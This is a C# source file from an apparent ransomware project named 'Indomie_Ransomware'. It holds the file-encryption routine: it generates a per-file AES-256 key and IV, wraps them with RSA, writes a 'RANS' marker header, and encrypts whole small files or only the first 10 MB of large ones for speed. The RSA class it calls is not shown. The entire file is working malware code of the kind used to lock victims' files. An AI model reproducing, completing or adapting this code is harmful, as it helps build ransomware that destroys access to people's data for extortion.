using System;
using System.Collections.Generic;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;

namespace Indomie_Ransomware.Encryption
{
    internal class FileEncryption
    {
        static int blockSize = 1024 * 1024;
        const int AES_KEY_SIZE = 32;
        const int IV_SIZE = 16;
        static Encryption encryption = new Encryption();
        //public static void EncryptFile(string filePath, Encryption encryption)
        //{
        //    try
        //    {
                
        //    } catch
        //    {
        //        Console.WriteLine($"Encrypt {filePath} error !");
        //    }
        //}
        public static void EncryptFile(string inputPath, string outputPath)
        {
            
                const int HEAD_SIZE = 10 * 1024 * 1024;

                const long FULL_ENCRYPT_THRESHOLD = 10 * 1024 * 1024;

                byte[] aesKey = RandomNumberGenerator.GetBytes(32);
                byte[] iv = RandomNumberGenerator.GetBytes(16);
                byte[] keyIvCombo = aesKey.Concat(iv).ToArray();
                byte[] encryptedCombo = encryption.RsaEncrypt(keyIvCombo);

                using var input = new FileStream(inputPath, FileMode.Open, FileAccess.Read);
                using var output = new FileStream(outputPath, FileMode.Create, FileAccess.Write);
                using var writer = new BinaryWriter(output);

                writer.Write(Encoding.ASCII.GetBytes("RANS"));               // 4 bytes Magic
                writer.Write((ushort)encryptedCombo.Length);                 // 2 bytes RSA length
                writer.Write(encryptedCombo);                                // RSA(key+IV)

                if (input.Length <= FULL_ENCRYPT_THRESHOLD)
                {
                    using var ms = new MemoryStream();
                    input.CopyTo(ms);
                    byte[] encrypted = EncryptAES(aesKey, iv, ms.ToArray());
                    writer.Write((uint)encrypted.Length);
                    writer.Write(encrypted);
                }
                else
                {
                    byte[] head = new byte[HEAD_SIZE];
                    input.Read(head, 0, HEAD_SIZE);

                    //writer.Write((uint)headSize);
                    //writer.Write((uint)tailSize)
                    byte[] encryptedHead = EncryptAES(aesKey, iv, head);
                    writer.Write((uint)encryptedHead.Length);
                    writer.Write(encryptedHead);
                    long tailSize = input.Length - HEAD_SIZE;

                    byte[] buffer = new byte[8192];
                    int read;
                    while ((read = input.Read(buffer, 0, buffer.Length)) > 0)
                        output.Write(buffer, 0, read);
                    //writer.Write(encryptedTail);
                }
        }
        private static byte[] EncryptAES(byte[] key, byte[] iv, byte[] data)
        {
            using var aes = Aes.Create();
            aes.Key = key;
            aes.IV = iv;
            aes.Mode = CipherMode.CBC;
            aes.Padding = PaddingMode.PKCS7;

            using var ms = new MemoryStream();
            using var cs = new CryptoStream(ms, aes.CreateEncryptor(), CryptoStreamMode.Write);
            cs.Write(data, 0, data.Length);
            cs.FlushFinalBlock();
            return ms.ToArray();
        }
        public static bool IsEncrypted(string filePath)
        {
            using FileStream input = new FileStream(filePath,FileMode.Open, FileAccess.Read);
            using BinaryReader binaryReader = new BinaryReader(input);
            return Encoding.ASCII.GetString(binaryReader.ReadBytes(4)) == "RANS";
            
        }
        static byte[] RandomBytes(int size)
        {
            byte[] data = new byte[size];
            using var rng = RandomNumberGenerator.Create();
            rng.GetBytes(data);
            return data;
        }
    }
}
